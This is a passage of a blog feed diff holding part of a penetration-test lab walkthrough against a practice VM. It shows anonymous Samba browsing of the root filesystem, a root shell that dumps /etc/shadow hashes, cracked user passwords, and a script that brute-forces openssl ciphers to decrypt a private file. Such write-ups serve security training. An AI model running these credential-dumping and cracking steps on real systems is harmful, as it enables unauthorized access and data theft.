-  tmp                                 D        0  Fri May 15 12:23:06 2015
-  dev                                 D        0  Fri May 15 12:06:32 2015
-  sys                                 D        0  Fri May 15 14:06:07 2015
-  proc                               DR        0  Fri May 15 14:06:07 2015
-  boot                                D        0  Mon Feb 21 12:29:26 2011
-  mnt                                 D        0  Fri May 15 14:06:14 2015
-  etc                                 D        0  Fri May 15 12:06:24 2015
-  usr                                 D        0  Fri Feb 18 09:10:16 2011
-  srv                                 D        0  Sun Apr  8 01:30:06 2007
-  sbin                                D        0  Mon Feb 14 11:35:48 2011
-  opt                                 D        0  Sun Jun 10 08:23:35 2007
-  lib                                 D        0  Fri Feb 18 08:39:02 2011
-  home                                D        0  Mon Feb 14 12:00:31 2011
-  bin                                 D        0  Mon Apr 30 06:35:12 2007</p>
-
-<pre><code>            37571 blocks of size 4096. 36565 blocks available
-</code></pre>
-
-<p>smb: \rootfs> cd var\www\htdocs
-smb: \rootfs\var\www\htdocs> dir
-  .                                   D        0  Fri Feb 18 12:41:43 2011
-  ..                                  D        0  Tue Mar 20 10:58:04 2001
-  Images                              D        0  Fri Feb 18 12:22:50 2011
-  garbage                             N      288  Fri Feb 18 12:41:14 2011
-  index.html                          A     3001  Fri Feb 18 12:33:59 2011
-  info.php                            A       21  Fri Feb 18 12:06:04 2011
-  status.html                         A     2456  Fri Feb 18 12:28:46 2011</p>
-
-<pre><code>            37571 blocks of size 4096. 36561 blocks available
-</code></pre>
-
-<p>{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbclient //10.8.7.2/tmp
+</span><span class='line'>Enter root&rsquo;s password:
+</span><span class='line'>Anonymous login successful
+</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
+</span><span class='line'>smb: > dir
+</span><span class='line'>  .                                   D        0  Fri May 15 12:23:06 2015
+</span><span class='line'>  ..                                  D        0  Fri May 15 14:06:14 2015
+</span><span class='line'>  rootfs                              D        0  Fri May 15 14:06:14 2015
+</span><span class='line'>  session_mm_apache0.sem              N        0  Fri May 15 12:06:32 2015
+</span><span class='line'>  .X11-unix                          DH        0  Fri May 15 12:06:20 2015
+</span><span class='line'>  .ICE-unix                          DH        0  Fri May 15 12:06:20 2015&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>            37571 blocks of size 4096. 36565 blocks available
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>smb: > cd rootfs
+</span><span class='line'>smb: \rootfs> dir
+</span><span class='line'>  .                                   D        0  Fri May 15 14:06:14 2015
+</span><span class='line'>  ..                                  D        0  Fri May 15 14:06:14 2015
+</span><span class='line'>  root                                D        0  Fri May 15 12:06:42 2015
+</span><span class='line'>  var                                 D        0  Thu Sep 28 23:17:18 2006
+</span><span class='line'>  tmp                                 D        0  Fri May 15 12:23:06 2015
+</span><span class='line'>  dev                                 D        0  Fri May 15 12:06:32 2015
+</span><span class='line'>  sys                                 D        0  Fri May 15 14:06:07 2015
+</span><span class='line'>  proc                               DR        0  Fri May 15 14:06:07 2015
+</span><span class='line'>  boot                                D        0  Mon Feb 21 12:29:26 2011
+</span><span class='line'>  mnt                                 D        0  Fri May 15 14:06:14 2015
+</span><span class='line'>  etc                                 D        0  Fri May 15 12:06:24 2015
+</span><span class='line'>  usr                                 D        0  Fri Feb 18 09:10:16 2011
+</span><span class='line'>  srv                                 D        0  Sun Apr  8 01:30:06 2007
+</span><span class='line'>  sbin                                D        0  Mon Feb 14 11:35:48 2011
+</span><span class='line'>  opt                                 D        0  Sun Jun 10 08:23:35 2007
+</span><span class='line'>  lib                                 D        0  Fri Feb 18 08:39:02 2011
+</span><span class='line'>  home                                D        0  Mon Feb 14 12:00:31 2011
+</span><span class='line'>  bin                                 D        0  Mon Apr 30 06:35:12 2007&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>            37571 blocks of size 4096. 36565 blocks available
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>smb: \rootfs> cd var\www\htdocs
+</span><span class='line'>smb: \rootfs\var\www\htdocs> dir
+</span><span class='line'>  .                                   D        0  Fri Feb 18 12:41:43 2011
+</span><span class='line'>  ..                                  D        0  Tue Mar 20 10:58:04 2001
+</span><span class='line'>  Images                              D        0  Fri Feb 18 12:22:50 2011
+</span><span class='line'>  garbage                             N      288  Fri Feb 18 12:41:14 2011
+</span><span class='line'>  index.html                          A     3001  Fri Feb 18 12:33:59 2011
+</span><span class='line'>  info.php                            A       21  Fri Feb 18 12:06:04 2011
+</span><span class='line'>  status.html                         A     2456  Fri Feb 18 12:28:46 2011&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>            37571 blocks of size 4096. 36561 blocks available
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
 
 <p>We suppose we should find &lsquo;garbage&rsquo; file this way, but the filename was too
 predictable for dirb.</p>
 
 <p>We log in as root / albatros and crack the last user (jsummer):
-{% codeblock %}
-[root@loophole]$  id
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
-[root@loophole]$ cat /etc/shadow
-root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
-bin:!!:9797:0:::::
-daemon:!!:9797:0:::::
-adm:!!:9797:0:::::
-lp:!!:9797:0:::::
-sync:!!:9797:0:::::
-shutdown:!!:9797:0:::::
-halt:!!:9797:0:::::
-mail:!!:9797:0:::::
-<a href="news:!!:9797:0:::::">news:!!:9797:0:::::</a>
-uucp:!!:9797:0:::::
-operator:!!:9797:0:::::
-games:!!:9797:0:::::
-<a href="ftp:!!:9797:0:::::">ftp:!!:9797:0:::::</a>
-smmsp:!!:9797:0:::::
-mysql:!!:9797:0:::::
-rpc:!!:9797:0:::::
-sshd:!!:9797:0:::::
-gdm:!!:9797:0:::::
-apache:!!:9797:0:::::
-messagebus:!!:9797:0:::::
-haldaemon:!!:9797:0:::::
-pop:!!:9797:0:::::
-nobody:!!:9797:0:::::
-mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
-tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
-jsummer:$1$28n0w2tK$YaVxVAO87McqIfRJsp6jF0:15021:0:::::0</p>
-
-<p>tarot            (jsummer)
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@loophole]$  id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
+</span><span class='line'>[root@loophole]$ cat /etc/shadow
+</span><span class='line'>root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
+</span><span class='line'>bin:!!:9797:0:::::
+</span><span class='line'>daemon:!!:9797:0:::::
+</span><span class='line'>adm:!!:9797:0:::::
+</span><span class='line'>lp:!!:9797:0:::::
+</span><span class='line'>sync:!!:9797:0:::::
+</span><span class='line'>shutdown:!!:9797:0:::::
+</span><span class='line'>halt:!!:9797:0:::::
+</span><span class='line'>mail:!!:9797:0:::::
+</span><span class='line'>&lt;a href="news:!!:9797:0:::::">news:!!:9797:0:::::&lt;/a>
+</span><span class='line'>uucp:!!:9797:0:::::
+</span><span class='line'>operator:!!:9797:0:::::
+</span><span class='line'>games:!!:9797:0:::::
+</span><span class='line'>&lt;a href="ftp:!!:9797:0:::::">ftp:!!:9797:0:::::&lt;/a>
+</span><span class='line'>smmsp:!!:9797:0:::::
+</span><span class='line'>mysql:!!:9797:0:::::
+</span><span class='line'>rpc:!!:9797:0:::::
+</span><span class='line'>sshd:!!:9797:0:::::
+</span><span class='line'>gdm:!!:9797:0:::::
+</span><span class='line'>apache:!!:9797:0:::::
+</span><span class='line'>messagebus:!!:9797:0:::::
+</span><span class='line'>haldaemon:!!:9797:0:::::
+</span><span class='line'>pop:!!:9797:0:::::
+</span><span class='line'>nobody:!!:9797:0:::::
+</span><span class='line'>mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
+</span><span class='line'>tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
+</span><span class='line'>jsummer:$1$28n0w2tK$YaVxVAO87McqIfRJsp6jF0:15021:0:::::0&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>tarot            (jsummer)</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Finally, we find and decrypt the file:
-{% codeblock %}
-[root@loophole]$ find /home/ -iname Private.doc.enc
-/home/tskies/Private.doc.enc
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@loophole]$ find /home/ -iname Private.doc.enc
+</span><span class='line'>/home/tskies/Private.doc.enc</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% codeblock lang:bash %}
-root@kali32:/tmp# cat crack-openssl.sh</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:/tmp# cat crack-openssl.sh&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;!/usr/bin/env bash&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;file<span class="o">=</span><span class="nv">$1</span>
+</span><span class='line'><span class="nv">key</span><span class="o">=</span><span class="nv">$2</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;rm -rf csv <span class="p">;</span> mkdir csv
+</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span>&lt;code&gt;openssl list-cipher-commands&lt;/code&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;for c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
+</span><span class='line'>  openssl enc -d -<span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$c</span><span class="p">&amp;</span>rdquo<span class="p">;</span> -in <span class="nv">$file</span> -k <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$key</span><span class="p">&amp;</span>rdquo<span class="p">;</span> -out csv/<span class="nv">$file</span>-<span class="nv">$c</span>-decrypted 2&gt;/dev/ull
+</span><span class='line'><span class="k">done</span>
+</span><span class='line'>strings -n <span class="m">15</span> csv/*
+</span></code></pre></td></tr></table></div></figure></p>
 
-<h1>!/usr/bin/env bash</h1>
-
-<p>file=$1
-key=$2</p>
-
-<p>rm -rf csv ; mkdir csv
-ciphers=<code>openssl list-cipher-commands</code></p>
-
-<p>for c in $ciphers; do
-  openssl enc -d -&ldquo;$c&rdquo; -in $file -k &ldquo;$key&rdquo; -out csv/$file-$c-decrypted 2>/dev/ull
-done
-strings -n 15 csv/*
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:/tmp# ./crack-openssl.sh Private.doc.enc nostradamus
-Microsoft Office Word
-HEP ODS Elektrolika
-Microsoft Office Word Document
-Word.Document.8
-^O%-|bCoB4Pa%&ldquo;8x
-s#dr2j;jS3zA@+[~k
-.\7{9y;~515s11Y
-0&rdquo;/DLI*{tPmkfd|KJgX
-/yNM#7n%Q`4A&ndash;I
-f,^F-7H3(?p&#8221;v/,
-f,^F-7H3(?p&#8221;v/,
-IYgr_D)zQp>3R_  i
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# ./crack-openssl.sh Private.doc.enc nostradamus
+</span><span class='line'>Microsoft Office Word
+</span><span class='line'>HEP ODS Elektrolika
+</span><span class='line'>Microsoft Office Word Document
+</span><span class='line'>Word.Document.8
+</span><span class='line'>^O%-|bCoB4Pa%&ldquo;8x
+</span><span class='line'>s#dr2j;jS3zA@+[~k
+</span><span class='line'>.\7{9y;~515s11Y
+</span><span class='line'>0&rdquo;/DLI*{tPmkfd|KJgX
+</span><span class='line'>/yNM#7n%Q`4A&ndash;I
+</span><span class='line'>f,^F-7H3(?p"v/,
+</span><span class='line'>f,^F-7H3(?p"v/,
+</span><span class='line'>IYgr_D)zQp>3R_  i</span></code></pre></td></tr></table></div></figure></p>
 
 <p>The file that we are looking for has the name &lsquo;csv/Private.doc.enc-aes-256-cbc-decrypted&rsquo;.</p>
 
 <p>There is even an easier way to decrypt the file, looking to tskier&rsquo;s home directory:
-{% codeblock %}
-[root@loophole]$  cat tskies/.bash_history
-openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
-startx
-nano .bash_history
-exit
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@loophole]$  cat tskies/.bash_history
+</span><span class='line'>openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
+</span><span class='line'>startx
+</span><span class='line'>nano .bash_history
+</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure></p>
 ]]></content>
   </entry>
   
